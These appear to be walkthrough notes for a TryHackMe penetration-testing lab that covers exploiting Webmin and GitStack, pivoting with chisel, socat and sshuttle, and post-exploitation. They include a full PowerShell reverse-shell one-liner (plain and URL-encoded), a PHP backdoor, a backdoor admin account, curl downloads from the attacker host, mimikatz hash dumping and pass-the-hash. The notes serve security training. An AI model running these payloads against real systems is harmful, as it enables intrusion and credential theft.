# Room
https://tryhackme.com/room/wreath

# Task 1 - Intro
* Pivoting
* C2
* Evasion

# Task 2 - Accessing the Network
Access

# Task 3 - Back Story
Story

# Task 4 - Brief
Three machines, public web server, git

# Task 5 - Web server Enumeration - nmap
* nmap
```
nmap -A -T4 10.200.98.200 -p 1-15000 | tee 10.200.98.200-nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 18:35 EDT
Nmap scan report for 10.200.98.200
Host is up (0.13s latency).
Not shown: 14995 filtered ports
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2021-03-22T22:28:10
|_Not valid after:  2022-03-22T22:28:10
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 109.73 seconds
```
* check web port
```
curl -IvL http://10.200.98.200
*   Trying 10.200.98.200:80...
* Connected to 10.200.98.200 (10.200.98.200) port 80 (#0)
> HEAD / HTTP/1.1
> Host: 10.200.98.200
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
HTTP/1.1 302 Found
< Date: Mon, 22 Mar 2021 22:38:57 GMT
Date: Mon, 22 Mar 2021 22:38:57 GMT
< Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
< Location: https://thomaswreath.thm
Location: https://thomaswreath.thm
< Content-Type: text/html; charset=iso-8859-1
Content-Type: text/html; charset=iso-8859-1

< 
* Connection #0 to host 10.200.98.200 left intact
* Issue another request to this URL: 'https://thomaswreath.thm/'
* Could not resolve host: thomaswreath.thm
* Closing connection 1
curl: (6) Could not resolve host: thomaswreath.thm
```
* point name to remote IP in hosts file
```
cat /etc/hosts | grep 10.200
10.200.98.200 thomaswreath.thm
```
* check web again, success
```
curl -ILk http://10.200.98.200
HTTP/1.1 302 Found
Date: Mon, 22 Mar 2021 22:42:00 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Location: https://thomaswreath.thm
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 200 OK
Date: Mon, 22 Mar 2021 22:42:01 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1c
Last-Modified: Sat, 07 Nov 2020 22:15:05 GMT
ETag: "3c17-5b38ba949f993"
Accept-Ranges: bytes
Content-Length: 15383
Content-Type: text/html; charset=UTF-8
```

# Task 6 - Web server Exploitation
* clone repo, install requirements, set executable bit
```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
Cloning into 'CVE-2019-15107'...
remote: Enumerating objects: 29, done.
remote: Counting objects: 100% (29/29), done.
remote: Compressing objects: 100% (23/23), done.
remote: Total 29 (delta 9), reused 14 (delta 3), pack-reused 0
Receiving objects: 100% (29/29), 19.47 KiB | 1.02 MiB/s, done.
Resolving deltas: 100% (9/9), done.

pip3 install -r requirements.txt 
Collecting argparse
  Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
Requirement already satisfied: requests in /usr/local/lib/python3.9/dist-packages (from -r requirements.txt (line 2)) (2.20.0)
Requirement already satisfied: urllib3 in /usr/local/lib/python3.9/dist-packages (from -r requirements.txt (line 3)) (1.24.3)
Requirement already satisfied: prompt_toolkit in /usr/lib/python3/dist-packages (from -r requirements.txt (line 4)) (3.0.14)
Requirement already satisfied: chardet<3.1.0,>=3.0.2 in /usr/local/lib/python3.9/dist-packages (from requests->-r requirements.txt (line 2)) (3.0.4)
Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests->-r requirements.txt (line 2)) (2020.6.20)
Requirement already satisfied: idna<2.8,>=2.5 in /usr/local/lib/python3.9/dist-packages (from requests->-r requirements.txt (line 2)) (2.7)
Installing collected packages: argparse
Successfully installed argparse-1.4.0

chmod +x CVE-2019-15107.py
```
* run the exploit code
```
./CVE-2019-15107.py 10.200.98.200                                                                                      
                                                                                                                                                                               
        __        __   _               _         ____   ____ _____                                                                                                             
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                                                                                            
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                                                                                              
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___                                                                                                             
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                                                                                             
                                                                                                                                                                               
                                                @MuirlandOracle                                                                                                                
                                                                                                                                                                               
                                                                                                                                                                               
[*] Server is running in SSL mode. Switching to HTTPS                                                                                                                          
[+] Connected to https://10.200.98.200:10000/ successfully.          
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# whoami
root
#
```
* with root access grab root password hash from /etc/shadow, grab SSH keys, chmod 600 file, test keys

# Task 7 - Pivoting
Pivoting uses access obtained on one machine to exploit another.  Example, exploit a public facing web server and then pivot to a db server

# Task 8 - Pivoting Overview
Some methods available for Pivoting are:
* Tunneling/Proxying - create a proxy through a compromised host and route traffic to a target
* Port Forwarding - create a connection between a local port and a single port on the target

Good enumeration will determine what type of Pivot method to use

# Task 9 - Pivoting Enumration
Enumeration via a compromised host in order of preference
* use material on the host
  * arp -a
  * /etc/hosts, /etc/resolv.conf
* use pre-installed tools
* use static compiled tools
  * compiled tools that do not require dependencies
* use live off the land techniques
  * use bash scripting, example - ping sweep
    ```
    for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done
    ```
* use local tools through a proxy

# Task 10 - Proxychains & Foxyproxy
Proxychains is a CLI tool that is used by prepending it to other commands
* proxychains nc 1.2.3.4 23

Proxychains reads the proxy port from the config file located in ./proxychains.conf, ~/.proxychains/proxychains.conf, or /etc/proxychains.conf in that order, this allows you to create a different proxy set for each engagement

Example config
```
[ProxyList]
socks4  127.0.0.1 1234
```

Proxychains can only be used for TCP scans, ICMP does not work, and it is extremely slow

FoxyProxy is a web browser extension/addon for Chrome and Firefox.  It is used a lot in tandem with Burp Suite, etc, and is most useful when assessing a web based target.  Once the proxy is active, all browser traffic will redirect to the proxy configured

# Task 11 - Pivoting with SSH tunnels and Port forwarding
Using the SSH client

Forwarding
* a forward or "local" SSH tunnel
* two methods
  * port forwarding and proxying
* port forwarding uses ssh -L, L links to a Local port
  * example: ssh -L 8000:1.2.3.4:80 user@1.2.3.8 -fN
    * -L links to a Local port which in this case is 8000
    * 1.2.3.4:80 is what we are linking the Local port 8000 to
    * user@1.2.3.8 is the host we have SSH access to
    * -f backgrounds the shell
    * -N doesn't execute commands
* proxying uses ssh -D, D opens a local port for your proxy
  * example: ssh -D 1234 user@1.2.3.8 -fN
    * -D opens port 1234 for the proxy
    * user@1.2.3.8 is the host we have SSH access to
    * -f backgrounds the shell
    * -N doesn't execute commands

Reverse
* used to access your attacking machine from the target
* setup
  * generate throwaway ssh keys with ssh-keygen on attack box
  * copy public key, prefix it with
    ```
    command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
    ```
  * paste into authorized_keys on attack box
  * copy private key to target
* create a reverse connection with ssh -R
  * connect to the host we have SSH access to, 1.2.3.8
  * use ssh -R to create a reverse connection to another box
  * ssh -R 8000:1.2.3.4:80 user@5.6.7.8 -i keyfile -fN
    * -R creates the reverse connection
    * 8000 is the local port on 1.2.3.8
    * 1.2.3.4:80 is the other box you can reach from 1.2.3.8
    * user@5.6.7.8 is your attacking machine
    * -i to specify the private key
    * -f backgrounds the shell
    * -N doesn't execute commands

# Task 12 - Pivoting - Plink
Plink.exe is the Windows CLI version of Putty.  To use keys from ssh-keygen you need to convert them with puttygen, puttygen keyfile -o output.ppk

To create a reverse connection:
```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

# Task 13 - Pivoting - Socat
Socat is great for fully stable shells, but is often not installed.  

Transfering socat:
```
attacker:
sudo python3 -m http.server 80

target:
curl [attacker_ip]/socat -o /tmp/socat-username && chmod +x /tmp/socat-username
```

Reverse shell relay with socat:
```
attacker:
sudo nc -nvlp 443

target:
./socat tcp-l:8000 tcp:[attacker_ip]:443 &
```
* tcp-l:8000 - creates a listener for port 8000
* tcp:[attacker_ip]:443 - connects back to the attacking host
* & - background the listener

Port forwarding with socat:
```
target:
./socat tcp-l:33060,fork,reuseaddr tcp:[target_ip]:3306 &
```
* tcp-l:33060 - creates a listener for port 33060
* fork - put every connection into a new process
* reuseaddr - port stays open after a connection is made to it
* tcp:[target_ip]:3306 - connects to the target on port 3306
* & - background the listener

Port forwarding (quiet - no open ports) with socat:
```
attacker:
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```
* create a local relay between 8001 and 8000 with reuse

```
target:
./socat tcp:[attacker_ip]:8001 tcp:[target_ip]:80,fork &
```
* connection from the listening port 80 on the target and the attacker on 8001

```
attacker:
request to localhost:8000
```
attacker > target flow
* request to localhost 8000
* go in 8000, come out 8001
* 8001 is connected to the compromised server on port 80

target > attacker flow
* response sent to socat, which goes to 8001 on the attacker
* inbound from 8001 of the target comes out 8000 on the attacker

# Task 14 - Pivoting - Chisel
Chisel is a TCP/UDP tunnel over HTTP

https://github.com/jpillora/chisel

Chisel has to be on both the attacker and target machine.  Chisel has two modes: client and server

Reverse SOCKS proxy with chisel:
* Connection from target back to attacker, port 1080 is used by default once the connection is established
```
attacker:

./chisel server -p [listen_port] --reverse &

target:
./chisel client [attacker_ip]:[listen_port] R:socks &
```

Forward SOCKS proxy with chisel:
```
target:

./chisel server -p [listen_port] --socks5

attacker:

./chisel client [target_ip]:[listen_port] [proxy_port]:socks
```

* Note: configure proxychains to use socks5

Remote port forward with chisel:
```
attacker:

./chisel server -p [listen_port] --reverse &

target:

./chisel client [attacker_ip]:[listen_port] R:[local_port]:[target_ip]:[target_port] &
```
* listen_port is the port that we started the chisel server on
* local_port is the port you connect to on the attacker machine that links you to target_port on the target machine

Local port forward with chisel:
```
target:

./chisel server -p [listen_port]

attacker:

./chisel client [target_ip]:[listen_port] [local_port]:[target_ip]:[target_port]
```

*Note: use the jobs command to see a list of backgrounded jobs

# Task 15 - Pivoting - sshuttle
sshuttle uses an SSH connection to create a tunnelled proxy, it simulates a VPN allowing us to route traffic through the proxy without proxychains

Install
* sudo apt install sshuttle

Connecting to a sshuttle server
* sshuttle -r user@host subnet
  * uses CIDR notation
* You can also use -N instead of subnet for automatically determining traffic

Key-based authentication
* sshuttle doesn't support key-based authentication but you can bypass it using --ssh-cmd
* sshuttle -r user@address --ssh-cmd "ssh -i [keyfile]" subnet

Broken pipe error, server died
* When connecting to a target that is also in the same subnet range as that you wish to route, exclude it to avoid this problem with -x address

# Task 16 - Pivoting - Conclusion
There are many different ways to pivot, further research is required for most targets

Summary of tools
* proxychains
* foxyproxy
* ssh
* plink
* socat
* chisel
* sshuttle

# Task 17 - git server enumeration
Remote enumeration steps
* Use prior task CVE to gain a remote shell
* Use provided shell command to create a reverse shell
* Upload static nmap binary to /tmp folder
* Scan remote network 10.200.98.0/24 with nmap to determine hosts that are alive (-sn)
* Pick in scope hosts
* Scan each host that is in scope and grab listening ports

# Task 18 - git server pivoting
Pivoting steps
* Download static chisel binary from https://github.com/jpillora/chisel/releases/tag/v1.7.6
* Transfer binary to host using prior shell
* Attacker
```
./chisel-[username] server -p 32000 --reverse &                                                      
[1] 4495                                                                                         
2021/03/27 18:45:01 server: Reverse tunnelling enabled  
2021/03/27 18:45:01 server: Fingerprint
2021/03/27 18:45:01 server: Listening on http://0.0.0.0:32000        
```
* Target
```
./chisel-[username] client 10.50.99.2:32000 R:32080:10.200.98.150:80 &                      
< client 10.50.99.2:32000 R:32080:10.200.98.150:80 &                                    
[1] 4584                                                                                
[root@prod-serv tmp]# 2021/03/27 22:45:08 client: Connecting to ws://10.50.99.2:32000   
2021/03/27 22:45:09 client: Connected (Latency 137.07726ms)                             
```
* Attacker
```
2021/03/27 18:45:08 server: session#1: tun: proxy#R:32080=>10.200.98.150:80: Listening  
                                                                                        
curl http://127.0.0.1:32080                    
                                                                                        
<!DOCTYPE html>                                                                         
<html lang="en">                                                                        
<head>                                                                                  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">                   
  <title>Page not found at /</title>                 
```
* Use searchsploit to look for exploits on the web service you found

# Task 19 - git server code review
Code review steps
* Use searchsploit to look for exploits
* Copy the exploit code
  ```
  searchsploit gitstack | yank-cli
  searchsploit -m php/webapps/[exploit].py
  Copied to: [exploit].py
  ```
* Remove line endings
  ```
  dos2unix [exploit].py 
  dos2unix: converting file [exploit].py to Unix format...
  ```
* Modify exploit
  * modify the exploit to point to localhost:32080 (port chosen for chisel)
  * modify \exploit.php to point to \exploit-username.php at the end of the file in two places

# Task 20 - git server exploitation
## Run exploit
* Run the modified exploit
  ```
  .[exploit].py 
  [+] Get user list
  [+] Found user twreath
  [+] Web repository already enabled
  [+] Get repositories list
  [+] Found repository Website
  [+] Add user to repository
  [+] Disable access for anyone
  [+] Create backdoor in PHP
  Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
  [+] Execute command
  "nt authority\system
  " 
  ```
* With the exploit code uploaded, you can use curl to run remote commands, example:
  ```
  curl -X POST http://localhost:32080/web/exploit-[username].php -d "a=whoami" 
  "nt authority\system                                                     
  "                                                   
  ```
* Enumerate the host and find basic info

## Setup a relay
* attacker: setup a listener with netcat
  ```
  nc -nvlp 3333
  listening on [any] 3333 ...
  ```
* relay host: setup a relay with socat
  * download latest socat release http://www.dest-unreach.org/socat/
  * compile code
    * gunzip file
    * tar -xvf file
    * cd dir
    * ./configure
    * make
    * make install
    * ./socat -h
  * copy socat-[username] to the /tmp dir on the relay host
    * attacker: sudo python3 -m http.server 80
    * relay host: curl http://[attacker_ip]/socat-[username] -O /tmp/socat-[username]
    * relay host: chmod +x /tmp/socat-[username]
  * open port on relay host to catch reverse shell from the target to relay to the attacker
    ```
    firewall-cmd --zone=public --add-port 32081/tcp
    success
    ```
  * open socat relay on relay host
    ```
    ./socat-[username] tcp-l:32081 tcp:10.50.99.2:3333 &
    [2] 5361
    ```
* target host: using the original exploit that allows us to run any command, we will execute a powershell script that creates a reverse shell to the relay host which then connects back to the attack box
  * powershell script, modify IP and PORT
    ```
    powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    ```
  * use URL encoder to encode the powershell script so we can pass the payload via curl
    * https://www.urlencoder.org/
    ```
    powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.98.200%27
    %2C32081%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes
    %2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B
    %24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%
    20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Fl
    ush%28%29%7D%3B%24client.Close%28%29%22
    ```
  * use curl to execute the payload through the exploitable php module that runs any command, prefix your encoded powershell script with a=
    ```
    curl -X POST -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.98.200%27
    %2C32081%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes
    %2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B
    %24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%
    20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Fl
    ush%28%29%7D%3B%24client.Close%28%29%22" http://localhost:32080/web/exploit-[username].php
    "<br />
    ```
## Catching the shell
If all goes well, you should catch the shell through the relay on the attack box
```
nc -nvlp 3333
listening on [any] 3333 ...
connect to [10.50.99.2] from (UNKNOWN) [10.200.98.200] 50108

PS C:\GitStack\gitphp> whoami
nt authority\system
```

# Task 21 - Stabilization and Post Exploitation
Using the NT Authority\System shell, create a new user, add it to the administrators group, and the remote management group
```
PS C:\GitStack\gitphp> net user user-[username] [password] /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup Administrators user-[username] /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" user-[username] /add
The command completed successfully.
```
Verify the addition
```
net user user-[username]
User name                    user-[username]
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            28/03/2021 22:11:19
Password expires             Never
Password changeable          28/03/2021 22:11:19
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users                
Global Group memberships     *None                 
The command completed successfully.
```
On the attacking system install evil-winrm
```
sudo gem install evil-winrm
```
On the attacking system setup a sshuttle connection to the web server to tunnel your traffic to the git server, use your available access to grab the private key for root
```
sudo sshuttle -r root@10.200.98.200 --ssh-cmd "ssh -i id_rsa" 10.200.98.150/32
```
Use evil-winrm to connect to the remote management group
```
evil-winrm -u user-[username] -p [password] -i 10.200.98.150

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user-[username]\Documents> whoami
git-serv\user-[username]
*Evil-WinRM* PS C:\Users\user-[username]\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
*Evil-WinRM* PS C:\Users\user-[username]\Documents>
```
Use xfreerdp as another way of accessing the system with the user you created above
```
xfreerdp /v:10.200.98.150 /u:user-[username] /p:[password] +clipboard /dynamic-resolution /drive:/usr/
share/windows-resources,share-[username]           
```
Once connected, open an administrative command prompt and load mimikatz from the share you established above
```
\\tsclient\share-[username]\mimikatz\x64\mimikatz.exe
```
Use mimikatz to grab hashes
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM
```
Once you have the hashes you can crack them with hashcat or use a website like https://crackstation.net/, you can also use evil-winrm to login remotely
```
evil-winrm -u Administrator -H [hash] -i [target]

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
git-serv\administrator
```

# Task 22 - Command and Control - Intro
Command and Control (C2) frameworks are used to consolidate an attacker's position and simplify post exploitation.  There are many C2 frameworks including
* Cobalt Strike
* Covenant
* Merlin
* Shadow
* PoshC2

PowerShell Empire is a framework built to attack Windows targets

# Task 23 - Command and Control - Empire Installation
Empire install
* sudo apt install powershell-empire
* sudo ./empire

Starkiller install
* sudo apt install starkiller
* sudo ./empire --headless &
* https://localhost:1337

# Task 24 - Command and Control - Empire Overview
PowerShell Empire major sections
* Listeners - list for connections
* Stagers - payloads generated by Empire
* Agents - connections to comrpomised targets
* Modules - used in conjunction with an agent to further exploit the target

